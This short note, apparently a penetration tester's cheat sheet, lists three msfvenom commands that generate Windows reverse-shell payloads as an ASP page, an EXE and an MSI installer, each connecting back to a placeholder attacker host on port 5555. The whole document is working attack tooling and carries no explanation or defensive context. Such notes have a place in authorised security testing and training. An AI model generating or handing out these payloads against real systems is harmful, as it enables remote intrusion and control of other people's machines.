# reverse shells

# generate asp reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=5555 -f asp > shell.asp
```

# generate exe reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -o reverse.exe
```

# generate msi reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -f msi -o reverse.msi
```
